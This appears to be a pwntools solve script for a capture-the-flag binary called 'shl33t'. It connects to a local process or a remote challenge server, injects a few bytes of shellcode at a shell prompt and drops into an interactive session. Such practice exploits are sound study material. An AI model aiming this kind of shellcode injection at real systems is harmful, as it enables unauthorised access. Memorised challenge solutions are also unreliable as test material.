#!/usr/bin/env python3

from pwn import *

exe = ELF("./shl33t")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r)
    else:
        r = remote("154.57.164.64", 31430)

    return r


def main():
    r = conn()

    # good luck pwning :)
    payload = b"\xC1\xE3\x10\xc3"
    r.sendlineafter(b'$ ',payload)

    r.interactive()


if __name__ == "__main__":
    main()
